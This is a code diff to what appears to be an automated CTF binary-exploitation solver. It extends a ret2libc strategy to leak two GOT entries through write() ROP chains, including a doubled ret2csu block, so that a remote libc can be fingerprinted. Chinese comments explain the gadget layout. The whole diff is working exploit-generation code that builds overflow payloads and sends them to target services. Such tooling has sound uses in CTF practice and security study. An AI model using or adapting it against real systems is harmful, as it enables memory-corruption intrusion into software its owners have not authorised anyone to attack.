@@ -499,6 +499,14 @@ def s_ret2libc_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
     got = ch.got("write") or ch.got("read")
     if not got:
         return
+    # 远程无 libc 文件：write 泄漏之外再多泄一个 GOT（printf/read），供 low12
+    # 指纹识别远程 libc（v7.0.4 同款；write 泄漏 8 字节可带多槽）
+    remote_no_libc = bool(getattr(ch, "host", None)) and not ch.libc_path
+    got2 = None
+    if remote_no_libc and ch.elf.bits == 64:
+        got2 = ch.got("printf") or ch.got("read") or ch.got("puts")
+        if got2 == got:
+            got2 = None
     g = f.gadgets
     base_chain = None
     if ch.elf.bits == 64 and g.get("pop_rdi") and g.get("pop_rsi") and g.get("pop_rdx"):
@@ -506,20 +514,39 @@ def s_ret2libc_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
                       + ch.p64(g["pop_rsi"]) + ch.p64(got)
                       + ch.p64(g["pop_rdx"]) + ch.p64(8)
                       + ch.p64(write))
+        if got2:
+            base_chain += (ch.p64(g["pop_rdi"]) + ch.p64(1)
+                           + ch.p64(g["pop_rsi"]) + ch.p64(got2)
+                           + ch.p64(g["pop_rdx"]) + ch.p64(8)
+                           + ch.p64(write))
+        base_chain += ch.p64(main)
     elif ch.elf.bits == 64 and f.csu:
         got_write = ch.got("write")
         if got_write:
-            base_chain = _csu_block(ch, f, got_write, 1, got, 8, main)
+            if got2:
+                # csu 双泄：两块连用时第二块不能重复 p64(A)（pop 槽错位），
+                # 直接续 6 参数 + call 块（手工实证 ae3f24d3）。
+                A, B_, _m = f.csu
+                blk2 = (ch.p64(0) + ch.p64(1) + ch.p64(got_write)
+                        + ch.p64(8) + ch.p64(got2) + ch.p64(1)
+                        + ch.p64(B_) + ch.p64(0) * 7 + ch.p64(main))
+                base_chain = (_csu_block(ch, f, got_write, 1, got, 8, A) + blk2)
+            else:
+                base_chain = _csu_block(ch, f, got_write, 1, got, 8, main)
     elif ch.elf.bits == 32:
         base_chain = (ch.p32(write) + ch.p32(main) + ch.p32(1) + ch.p32(got) + ch.p32(8))
     if not base_chain:
         return
     for off, sink in _offsets(ch, f):
-        for pre in _presets(ch, f):
+        presets = _presets(ch, f)
+        if got2:
+            presets = [b""]        # 远程双泄：跳过 scanf preset（与 s_ret2libc 同理）
+        for pre in presets:
             payload = _pad(ch, off) + _align(ch, f, ch.elf.bits == 64) + base_chain
             sends = ([pre] if pre else []) + [payload + _term(sink)]
+            extra = "+%#x" % got2 if got2 else ""
             yield Plan("ret2libc_write", sends,
-                       f"write(1, {hex(got)}, 8) leak off={off}",
+                       f"write(1, {hex(got)}{extra}, 8) leak off={off}",
                        tag=f"stage1:write:{off}:{sink}")
 
 
